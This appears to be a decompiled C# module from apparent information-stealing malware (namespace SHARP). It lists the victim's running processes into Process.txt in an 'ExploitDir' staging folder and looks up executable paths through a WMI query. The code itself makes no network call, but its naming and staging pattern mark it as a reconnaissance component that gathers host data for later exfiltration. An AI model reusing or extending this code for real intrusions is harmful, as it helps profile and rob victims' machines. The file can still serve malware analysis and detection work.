﻿using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace SHARP
{
	// Token: 0x0200004C RID: 76
	internal class ProcessList
	{
		// Token: 0x06000159 RID: 345 RVA: 0x00007C08 File Offset: 0x00005E08
		public static void WriteProcesses()
		{
			string exploitDir = Help.ExploitDir;
			foreach (Process process in Process.GetProcesses())
			{
				File.AppendAllText(exploitDir + "\\Process.txt", "NAME: " + process.ProcessName + "\n\n");
			}
		}

		// Token: 0x0600015A RID: 346 RVA: 0x00007C58 File Offset: 0x00005E58
		public static string ProcessExecutablePath(Process process)
		{
			try
			{
				return process.MainModule.FileName;
			}
			catch
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					object obj = managementObject["ProcessID"];
					object obj2 = managementObject["ExecutablePath"];
					if (obj2 != null && obj.ToString() == process.Id.ToString())
					{
						return obj2.ToString();
					}
				}
			}
			return "";
		}
	}
}
